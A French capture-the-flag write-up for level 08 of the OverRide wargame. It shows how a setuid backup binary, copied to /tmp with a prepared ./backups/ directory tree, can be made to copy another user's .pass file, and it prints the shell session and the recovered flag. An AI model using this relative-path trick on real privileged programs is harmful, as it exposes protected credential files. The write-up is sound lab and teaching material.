# Level 08

## Introduction

Je reste perplexe sur la difficulté de cet exercice. Très simple et pas besoin de gdb.

Le programme fait un backup du fichier préciser en respectant le chemin d'accès vers le fichier. Le programme ne crée pas de lui même les dossiers. Il est donc nécessaire de faire (`mkdir -p "./backups/foo/bar"`), mais on n'a pas les droits suffisants dans le dossier `./backups/`. C'est pourquoi je copie le binaire vers le dossier `/tmp/` pour créer mon propre dossier `/backups/` avec les bonnes permissions.

## Resumé

 1. Décompiler le programme : https://dogbolt.org/?id=fb42ad07-6308-45df-b8f7-fe3953c56ac1 ;
 2. Copier le binaire (level08) dans `/tmp/` ;
 3. Créer avec mkdir le chemin `/tmp/backups/home/users/level08/` ;
 4. Lancer `level08` avec le chemin d'accès vers le flag (`/home/users/level08/.pass`) ;
 5. Récupérer le flag via le backup : `cat /tmp/backups/home/users/level08/.pass`

## Etapes

(Voir [source.c](../source.c) pour le code complet)

Déroulé :

```sh
level08@OverRide:~$ cp ./level08 /tmp/
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ ls
level08
level08@OverRide:/tmp$ mkdir -p "./backups/home/users/level08/"
level08@OverRide:/tmp$ ./level08 "/home/users/level08/.pass"
level08@OverRide:/tmp$ cd "./backups/home/users/level08/"
level08@OverRide:/tmp/backups/home/users/level08$ cat .pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

On a donc le flag :

```
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
